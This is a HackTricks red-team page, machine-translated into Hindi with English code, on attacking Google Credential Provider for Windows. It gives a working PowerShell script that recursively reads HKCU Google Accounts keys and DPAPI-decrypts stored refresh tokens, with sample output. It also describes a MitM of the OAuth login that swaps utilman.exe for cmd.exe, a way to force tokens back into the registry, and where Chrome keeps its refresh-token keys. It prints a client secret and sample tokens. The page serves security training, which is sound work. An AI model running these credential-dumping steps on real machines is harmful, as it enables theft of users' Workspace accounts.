# GWS - Workspace Sync Attacks (GCPW, GCDS, Directory Sync with AD & EntraID)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## GCPW - Google Credential Provider for Windows

‡§Ø‡§π ‡§è‡§ï‡§≤ ‡§∏‡§æ‡§á‡§®-‡§ë‡§® ‡§π‡•à ‡§ú‡•ã Google Workspaces ‡§™‡•ç‡§∞‡§¶‡§æ‡§® ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§§‡§æ‡§ï‡§ø ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§Ö‡§™‡§®‡•á Windows PCs ‡§Æ‡•á‡§Ç **‡§Ö‡§™‡§®‡•á Workspace ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤‡•ç‡§∏** ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§≤‡•â‡§ó‡§ø‡§® ‡§ï‡§∞ ‡§∏‡§ï‡•á‡§Ç‡•§ ‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ, ‡§Ø‡§π ‡§ï‡•Å‡§õ ‡§∏‡•ç‡§•‡§æ‡§®‡•ã‡§Ç ‡§™‡§∞ Google Workspace ‡§§‡§ï ‡§™‡§π‡•Å‡§Å‡§ö‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ü‡•ã‡§ï‡§® ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π‡•Ä‡§§ ‡§ï‡§∞‡•á‡§ó‡§æ‡•§

{% hint style="success" %}
‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) **GCPW** ‡§ï‡§æ ‡§™‡§§‡§æ ‡§≤‡§ó‡§æ‡§®‡•á, ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞‡•á‡§∂‡§® ‡§ï‡•á ‡§¨‡§æ‡§∞‡•á ‡§Æ‡•á‡§Ç ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡§®‡•á ‡§î‡§∞ **‡§Ø‡§π‡§æ‡§Å ‡§§‡§ï ‡§ï‡§ø ‡§ü‡•ã‡§ï‡§®** ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡§®‡•á ‡§Æ‡•á‡§Ç ‡§∏‡§ï‡•ç‡§∑‡§Æ ‡§π‡•à‡•§
{% endhint %}

### GCPW - MitM

‡§ú‡§¨ ‡§è‡§ï ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ GCPW ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á Google Workspace ‡§ï‡•á ‡§∏‡§æ‡§• ‡§∏‡§Æ‡§®‡•ç‡§µ‡§Ø‡§ø‡§§ Windows PC ‡§§‡§ï ‡§™‡§π‡•Å‡§Å‡§ö‡§§‡§æ ‡§π‡•à, ‡§§‡•ã ‡§â‡§∏‡•á ‡§è‡§ï ‡§∏‡§æ‡§Æ‡§æ‡§®‡•ç‡§Ø ‡§≤‡•â‡§ó‡§ø‡§® ‡§´‡•â‡§∞‡•ç‡§Æ ‡§™‡•Ç‡§∞‡§æ ‡§ï‡§∞‡§®‡§æ ‡§π‡•ã‡§ó‡§æ‡•§ ‡§Ø‡§π ‡§≤‡•â‡§ó‡§ø‡§® ‡§´‡•â‡§∞‡•ç‡§Æ ‡§è‡§ï OAuth ‡§ï‡•ã‡§° ‡§≤‡•å‡§ü‡§æ‡§è‡§ó‡§æ ‡§ú‡§ø‡§∏‡•á PC ‡§è‡§ï ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§Æ‡•á‡§Ç ‡§∞‡§ø‡§´‡•ç‡§∞‡•á‡§∂ ‡§ü‡•ã‡§ï‡§® ‡§ï‡•á ‡§≤‡§ø‡§è ‡§µ‡§ø‡§®‡§ø‡§Æ‡§Ø ‡§ï‡§∞‡•á‡§ó‡§æ ‡§ú‡•à‡§∏‡•á: 

{% code overflow="wrap" %}
```http
POST /oauth2/v4/token HTTP/2
Host: www.googleapis.com
Content-Length: 311
Content-Type: application/x-www-form-urlencoded
[...headers...]

scope=https://www.google.com/accounts/OAuthLogin
&grant_type=authorization_code
&client_id=77185425430.apps.googleusercontent.com
&client_secret=OTJgUOQcT7lO7GsGZq2G4IlT
&code=4/0AVG7fiQ1NKncRzNrrGjY5S02wBWBJxV9kUNSKvB1EnJDCWyDmfZvelqKp0zx8jRGmR7LUw
&device_id=d5c82f70-71ff-48e8-94db-312e64c7354f
&device_type=chrome
```
{% endcode %}

‡§®‡§à ‡§™‡§Ç‡§ï‡•ç‡§§‡§ø‡§Ø‡§æ‡§Å ‡§á‡§∏‡•á ‡§Ö‡§ß‡§ø‡§ï ‡§™‡§†‡§®‡•Ä‡§Ø ‡§¨‡§®‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ú‡•ã‡§°‡§º‡•Ä ‡§ó‡§à ‡§π‡•à‡§Ç‡•§

{% hint style="info" %}
‡§Ø‡§π ‡§è‡§ï MitM ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡§Ç‡§≠‡§µ ‡§•‡§æ `Proxifier` ‡§ï‡•ã PC ‡§Æ‡•á‡§Ç ‡§∏‡•ç‡§•‡§æ‡§™‡§ø‡§§ ‡§ï‡§∞‡§ï‡•á, `utilman.exe` ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§ï‡•ã `cmd.exe` ‡§ï‡•á ‡§∏‡§æ‡§• ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§ï‡§∞‡§ï‡•á ‡§î‡§∞ Windows ‡§≤‡•â‡§ó‡§ø‡§® ‡§™‡•É‡§∑‡•ç‡§† ‡§Æ‡•á‡§Ç **‡§è‡§ï‡•ç‡§∏‡•á‡§∏‡§ø‡§¨‡§ø‡§≤‡§ø‡§ü‡•Ä ‡§´‡•Ä‡§ö‡§∞‡•ç‡§∏** ‡§ï‡•ã ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡§ï‡•á, ‡§ú‡•ã ‡§è‡§ï **CMD** ‡§ï‡•ã ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡•á‡§ó‡§æ ‡§ú‡§ø‡§∏‡§∏‡•á ‡§Ü‡§™ **Proxifier ‡§ï‡•ã ‡§≤‡•â‡§®‡•ç‡§ö ‡§î‡§∞ ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞** ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§\
**QUICK UDP** ‡§ü‡•ç‡§∞‡•à‡§´‡§º‡§ø‡§ï ‡§ï‡•ã `Proxifier` ‡§Æ‡•á‡§Ç ‡§¨‡•ç‡§≤‡•â‡§ï ‡§ï‡§∞‡§®‡§æ ‡§® ‡§≠‡•Ç‡§≤‡•á‡§Ç ‡§§‡§æ‡§ï‡§ø ‡§Ø‡§π TCP ‡§∏‡§Ç‡§ö‡§æ‡§∞ ‡§Æ‡•á‡§Ç ‡§°‡§æ‡§â‡§®‡§ó‡•ç‡§∞‡•á‡§° ‡§π‡•ã ‡§ú‡§æ‡§è ‡§î‡§∞ ‡§Ü‡§™ ‡§á‡§∏‡•á ‡§¶‡•á‡§ñ ‡§∏‡§ï‡•á‡§Ç‡•§

"Serviced and other users" ‡§Æ‡•á‡§Ç ‡§¶‡•ã‡§®‡•ã‡§Ç ‡§µ‡§ø‡§ï‡§≤‡•ç‡§™‡•ã‡§Ç ‡§ï‡•ã ‡§≠‡•Ä ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞ ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞ Windows ‡§Æ‡•á‡§Ç Burp CA ‡§™‡•ç‡§∞‡§Æ‡§æ‡§£‡§™‡§§‡•ç‡§∞ ‡§∏‡•ç‡§•‡§æ‡§™‡§ø‡§§ ‡§ï‡§∞‡•á‡§Ç‡•§
{% endhint %}

‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ **`HKLM:\SOFTWARE\Google\GCPW`** ‡§Æ‡•á‡§Ç `enable_verbose_logging = 1` ‡§î‡§∞ `log_file_path = C:\Public\gcpw.log` ‡§ï‡•Å‡§Ç‡§ú‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡•ã ‡§ú‡•ã‡§°‡§º‡§ï‡§∞ ‡§ï‡•Å‡§õ ‡§≤‡•â‡§ó‡•ç‡§∏ ‡§ï‡•ã ‡§∏‡•ç‡§ü‡•ã‡§∞ ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à‡•§

### GCPW - ‡§´‡§ø‡§Ç‡§ó‡§∞‡§™‡•ç‡§∞‡§ø‡§Ç‡§ü

‡§Ø‡§π ‡§ú‡§æ‡§Ç‡§ö‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à ‡§ï‡§ø ‡§ï‡•ç‡§Ø‡§æ GCPW ‡§ï‡§ø‡§∏‡•Ä ‡§°‡§ø‡§µ‡§æ‡§á‡§∏ ‡§Æ‡•á‡§Ç ‡§∏‡•ç‡§•‡§æ‡§™‡§ø‡§§ ‡§π‡•à ‡§Ø‡§π ‡§ú‡§æ‡§Ç‡§ö‡§ï‡§∞ ‡§ï‡§ø ‡§ï‡•ç‡§Ø‡§æ ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ ‡§Æ‡•å‡§ú‡•Ç‡§¶ ‡§π‡•à ‡§Ø‡§æ ‡§ï‡•ç‡§Ø‡§æ ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡•ç‡§∞‡•Ä ‡§ï‡•Å‡§Ç‡§ú‡§ø‡§Ø‡§æ‡§Å ‡§Æ‡•å‡§ú‡•Ç‡§¶ ‡§π‡•à‡§Ç:
```powershell
# Check process gcpw_extension.exe
if (Get-Process -Name "gcpw_extension" -ErrorAction SilentlyContinue) {
Write-Output "The process gcpw_xtension.exe is running."
} else {
Write-Output "The process gcpw_xtension.exe is not running."
}

# Check if HKLM\SOFTWARE\Google\GCPW\Users exists
$gcpwHKLMPath = "HKLM:\SOFTWARE\Google\GCPW\Users"
if (Test-Path $gcpwHKLMPath) {
Write-Output "GCPW is installed: The key $gcpwHKLMPath exists."
} else {
Write-Output "GCPW is not installed: The key $gcpwHKLMPath does not exist."
}

# Check if HKCU\SOFTWARE\Google\Accounts exists
$gcpwHKCUPath = "HKCU:\SOFTWARE\Google\Accounts"
if (Test-Path $gcpwHKCUPath) {
Write-Output "Google Accounts are present: The key $gcpwHKCUPath exists."
} else {
Write-Output "No Google Accounts found: The key $gcpwHKCUPath does not exist."
}
```
In **`HKCU:\SOFTWARE\Google\Accounts`** ‡§Ø‡§π ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à ‡§ï‡§ø ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡§æ ‡§à‡§Æ‡•á‡§≤ ‡§î‡§∞ ‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü‡•á‡§° **refresh token** ‡§§‡§ï ‡§™‡§π‡•Å‡§Ç‡§ö‡§æ ‡§ú‡§æ ‡§∏‡§ï‡•á ‡§Ø‡§¶‡§ø ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§π‡§æ‡§≤ ‡§π‡•Ä ‡§Æ‡•á‡§Ç ‡§≤‡•â‡§ó‡§ø‡§® ‡§π‡•Å‡§Ü ‡§π‡•ã‡•§

In **`HKLM:\SOFTWARE\Google\GCPW\Users`** ‡§Ø‡§π ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à ‡§ï‡§ø **domains** ‡§ï‡•ã ‡§ñ‡•ã‡§ú‡§æ ‡§ú‡§æ ‡§∏‡§ï‡•á ‡§ú‡•ã `domains_allowed` ‡§ï‡•Å‡§Ç‡§ú‡•Ä ‡§Æ‡•á‡§Ç ‡§≤‡•â‡§ó‡§ø‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§π‡•à ‡§î‡§∞ ‡§â‡§™‡§ï‡•Å‡§Ç‡§ú‡§ø‡§Ø‡•ã‡§Ç ‡§Æ‡•á‡§Ç ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡•á ‡§¨‡§æ‡§∞‡•á ‡§Æ‡•á‡§Ç ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§ú‡•à‡§∏‡•á ‡§à‡§Æ‡•á‡§≤, ‡§ö‡§ø‡§§‡•ç‡§∞, ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§®‡§æ‡§Æ, ‡§ü‡•ã‡§ï‡§® ‡§ú‡•Ä‡§µ‡§®‡§ï‡§æ‡§≤, ‡§ü‡•ã‡§ï‡§® ‡§π‡•à‡§Ç‡§°‡§≤ ‡§Ü‡§¶‡§ø ‡§Æ‡§ø‡§≤ ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à...

{% hint style="info" %}
‡§ü‡•ã‡§ï‡§® ‡§π‡•à‡§Ç‡§°‡§≤ ‡§è‡§ï ‡§ü‡•ã‡§ï‡§® ‡§π‡•à ‡§ú‡•ã `eth.` ‡§∏‡•á ‡§∂‡•Å‡§∞‡•Ç ‡§π‡•ã‡§§‡§æ ‡§π‡•à ‡§î‡§∞ ‡§ú‡§ø‡§∏‡§∏‡•á ‡§ï‡•Å‡§õ ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§®‡§ø‡§ï‡§æ‡§≤‡•Ä ‡§ú‡§æ ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à ‡§ú‡•à‡§∏‡•á:

{% code overflow="wrap" %}
```bash
curl -s 'https://www.googleapis.com/oauth2/v2/tokeninfo' \
-d 'token_handle=eth.ALh9Bwhhy_aDaRGhv4v81xRNXdt8BDrWYrM2DBv-aZwPdt7U54gp-m_3lEXsweSyUAuN3J-9KqzbDgHBfFzYqVink340uYtWAwxsXZgqFKrRGzmXZcJNVapkUpLVsYZ_F87B5P_iUzTG-sffD4_kkd0SEwZ0hSSgKVuLT-2eCY67qVKxfGvnfmg'
# Example response
{
"audience": "77185425430.apps.googleusercontent.com",
"scope": "https://www.google.com/accounts/OAuthLogin",
"expires_in": 12880152
}
```
{% endcode %}

‡§Ø‡§π ‡§≠‡•Ä ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à ‡§ï‡§ø ‡§è‡§ï ‡§Ö‡§®‡•Å‡§∞‡•ã‡§ß ‡§ï‡•á ‡§∏‡§æ‡§• ‡§è‡§ï ‡§è‡§ï‡•ç‡§∏‡•á‡§∏ ‡§ü‡•ã‡§ï‡§® ‡§ï‡•á ‡§ü‡•ã‡§ï‡§® ‡§π‡•à‡§Ç‡§°‡§≤ ‡§ï‡•ã ‡§ñ‡•ã‡§ú‡§æ ‡§ú‡§æ‡§è:

{% code overflow="wrap" %}
```bash
curl -s 'https://www.googleapis.com/oauth2/v2/tokeninfo' \
-d 'access_token=<access token>'
# Example response
{
"issued_to": "77185425430.apps.googleusercontent.com",
"audience": "77185425430.apps.googleusercontent.com",
"scope": "https://www.google.com/accounts/OAuthLogin",
"expires_in": 1327,
"access_type": "offline",
"token_handle": "eth.ALh9Bwhhy_aDaRGhv4v81xRNXdt8BDrWYrM2DBv-aZwPdt7U54gp-m_3lEXsweSyUAuN3J-9KqzbDgHBfFzYqVink340uYtWAwxsXZgqFKrRGzmXZcJNVapkUpLVsYZ_F87B5P_iUzTG-sffD4_kkd0SEwZ0hSSgKVuLT-2eCY67qVKxfGvnfmg"
}
```
{% endcode %}

‡§Æ‡•á‡§∞‡•á ‡§Ö‡§®‡•Å‡§∏‡§æ‡§∞, ‡§ü‡•ã‡§ï‡§® ‡§π‡•à‡§Ç‡§°‡§≤ ‡§∏‡•á ‡§∞‡§ø‡§´‡•ç‡§∞‡•á‡§∂ ‡§ü‡•ã‡§ï‡§® ‡§Ø‡§æ ‡§è‡§ï‡•ç‡§∏‡•á‡§∏ ‡§ü‡•ã‡§ï‡§® ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à‡•§
{% endhint %}

‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ, ‡§´‡§º‡§æ‡§á‡§≤ **`C:\ProgramData\Google\Credential Provider\Policies\<sid>\PolicyFetchResponse`** ‡§è‡§ï json ‡§π‡•à ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç ‡§µ‡§ø‡§≠‡§ø‡§®‡•ç‡§® **‡§∏‡•á‡§ü‡§ø‡§Ç‡§ó‡•ç‡§∏** ‡§ï‡•Ä ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§π‡•ã‡§§‡•Ä ‡§π‡•à ‡§ú‡•à‡§∏‡•á `enableDmEnrollment`, `enableGcpAutoUpdate`, `enableMultiUserLogin` (‡§Ø‡§¶‡§ø Workspace ‡§ï‡•á ‡§ï‡§à ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡§Ç‡§™‡•ç‡§Ø‡•Ç‡§ü‡§∞ ‡§Æ‡•á‡§Ç ‡§≤‡•â‡§ó‡§ø‡§® ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç) ‡§î‡§∞ `validityPeriodDays` (‡§¶‡§ø‡§®‡•ã‡§Ç ‡§ï‡•Ä ‡§∏‡§Ç‡§ñ‡•ç‡§Ø‡§æ ‡§ú‡§¨ ‡§è‡§ï ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡•ã ‡§∏‡•Ä‡§ß‡•á Google ‡§ï‡•á ‡§∏‡§æ‡§• ‡§´‡§ø‡§∞ ‡§∏‡•á ‡§™‡•ç‡§∞‡§Æ‡§æ‡§£‡§ø‡§§ ‡§π‡•ã‡§®‡•á ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•ã‡§§‡•Ä)‡•§

### GCPW - ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡•ç‡§∞‡•Ä ‡§∞‡§ø‡§´‡•ç‡§∞‡•á‡§∂ ‡§ü‡•ã‡§ï‡§®

‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡•ç‡§∞‡•Ä **`HKCU:\SOFTWARE\Google\Accounts`** ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§ï‡•Å‡§õ ‡§ñ‡§æ‡§§‡•ã‡§Ç ‡§ï‡•ã **`refresh_token`** ‡§ï‡•á ‡§∏‡§æ‡§• ‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü‡•á‡§° ‡§™‡§æ‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§ ‡§µ‡§ø‡§ß‡§ø **`ProtectedData.Unprotect`** ‡§á‡§∏‡•á ‡§Ü‡§∏‡§æ‡§®‡•Ä ‡§∏‡•á ‡§°‡§ø‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à‡•§

<details>

<summary>‡§°‡•á‡§ü‡§æ ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡•á‡§Ç <strong><code>HKCU:\SOFTWARE\Google\Accounts</code></strong> ‡§î‡§∞ ‡§∞‡§ø‡§´‡•ç‡§∞‡•á‡§∂_‡§ü‡•ã‡§ï‡§® ‡§ï‡•ã ‡§°‡§ø‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§ï‡§∞‡•á‡§Ç</summary>
```powershell
# Import required namespace for decryption
Add-Type -AssemblyName System.Security

# Base registry path
$baseKey = "HKCU:\SOFTWARE\Google\Accounts"

# Function to search and decrypt refresh_token values
function Get-RegistryKeysAndDecryptTokens {
param (
[string]$keyPath
)

# Get all values within the current key
$registryKey = Get-Item -Path $keyPath
$foundToken = $false

# Loop through properties to find refresh_token
foreach ($property in $registryKey.Property) {
if ($property -eq "refresh_token") {
$foundToken = $true
try {
# Get the raw bytes of the refresh_token from the registry
$encryptedTokenBytes = (Get-ItemProperty -Path $keyPath -Name $property).$property

# Decrypt the bytes using ProtectedData.Unprotect
$decryptedTokenBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedTokenBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
$decryptedToken = [System.Text.Encoding]::UTF8.GetString($decryptedTokenBytes)

Write-Output "Path: $keyPath"
Write-Output "Decrypted refresh_token: $decryptedToken"
Write-Output "-----------------------------"
}
catch {
Write-Output "Path: $keyPath"
Write-Output "Failed to decrypt refresh_token: $($_.Exception.Message)"
Write-Output "-----------------------------"
}
}
}

# Recursively process all subkeys
Get-ChildItem -Path $keyPath | ForEach-Object {
Get-RegistryKeysAndDecryptTokens -keyPath $_.PSPath
}
}

# Start the search from the base key
Get-RegistryKeysAndDecryptTokens -keyPath $baseKey
```
</details>

‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§Ü‡§â‡§ü:

{% code overflow="wrap" %}
```
Path: Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\SOFTWARE\Google\Accounts\100402336966965820570Decrypted refresh_token: 1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI
```
{% endcode %}

‡§ú‡•à‡§∏‡§æ ‡§ï‡§ø [**‡§á‡§∏ ‡§µ‡•Ä‡§°‡§ø‡§Ø‡•ã**](https://www.youtube.com/watch?v=FEQxHRRP\_5I) ‡§Æ‡•á‡§Ç ‡§∏‡§Æ‡§ù‡§æ‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à, ‡§Ø‡§¶‡§ø ‡§Ü‡§™ ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡•ç‡§∞‡•Ä ‡§Æ‡•á‡§Ç ‡§ü‡•ã‡§ï‡§® ‡§®‡§π‡•Ä‡§Ç ‡§™‡§æ‡§§‡•á ‡§π‡•à‡§Ç, ‡§§‡•ã **`HKLM:\SOFTWARE\Google\GCPW\Users\<sid>\th`** ‡§∏‡•á ‡§Æ‡§æ‡§® ‡§ï‡•ã ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ (‡§Ø‡§æ ‡§π‡§ü‡§æ‡§®‡•á) ‡§ï‡•Ä ‡§∏‡§Ç‡§≠‡§æ‡§µ‡§®‡§æ ‡§π‡•à ‡§î‡§∞ ‡§Ö‡§ó‡§≤‡•Ä ‡§¨‡§æ‡§∞ ‡§ú‡§¨ ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡§Ç‡§™‡•ç‡§Ø‡•Ç‡§ü‡§∞ ‡§§‡§ï ‡§™‡§π‡•Å‡§Ç‡§ö‡§§‡§æ ‡§π‡•à, ‡§§‡•ã ‡§â‡§∏‡•á ‡§´‡§ø‡§∞ ‡§∏‡•á ‡§≤‡•â‡§ó‡§ø‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•ã‡§ó‡•Ä ‡§î‡§∞ **‡§ü‡•ã‡§ï‡§® ‡§™‡§ø‡§õ‡§≤‡•á ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡•ç‡§∞‡•Ä ‡§Æ‡•á‡§Ç ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π‡•Ä‡§§ ‡§π‡•ã‡§ó‡§æ**‡•§

### GCPW - ‡§°‡§ø‡§∏‡•ç‡§ï ‡§∞‡§ø‡§´‡•ç‡§∞‡•á‡§∂ ‡§ü‡•ã‡§ï‡§®

‡§´‡§æ‡§á‡§≤ **`%LocalAppData%\Google\Chrome\User Data\Local State`** ‡§Æ‡•á‡§Ç **`refresh_tokens`** ‡§ï‡•ã ‡§°‡§ø‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡•Å‡§Ç‡§ú‡•Ä ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π‡•Ä‡§§ ‡§π‡•ã‡§§‡•Ä ‡§π‡•à ‡§ú‡•ã ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡•á **Google Chrome ‡§™‡•ç‡§∞‡•ã‡§´‡§æ‡§á‡§≤** ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§∏‡•ç‡§•‡§ø‡§§ ‡§π‡•ã‡§§‡•Ä ‡§π‡•à ‡§ú‡•à‡§∏‡•á:

* `%LocalAppData%\Google\Chrome\User Data\Default\Web Data`
* `%LocalAppData%\Google\Chrome\Profile*\Default\Web Data`

‡§á‡§® ‡§ü‡•ã‡§ï‡§®‡•ã‡§Ç ‡§ï‡•ã ‡§â‡§®‡§ï‡•á ‡§°‡§ø‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü‡•á‡§° ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§è‡§ï‡•ç‡§∏‡•á‡§∏ ‡§ï‡§∞‡§®‡•á ‡§µ‡§æ‡§≤‡•á ‡§ï‡•Å‡§õ **C# ‡§ï‡•ã‡§°** ‡§ï‡•ã [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) ‡§Æ‡•á‡§Ç ‡§™‡§æ‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§

‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ, ‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü‡§ø‡§Ç‡§ó ‡§á‡§∏ ‡§ï‡•ã‡§° ‡§Æ‡•á‡§Ç ‡§™‡§æ‡§à ‡§ú‡§æ ‡§∏‡§ï‡§§‡•Ä ‡§π‡•à: [https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L216](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L216)

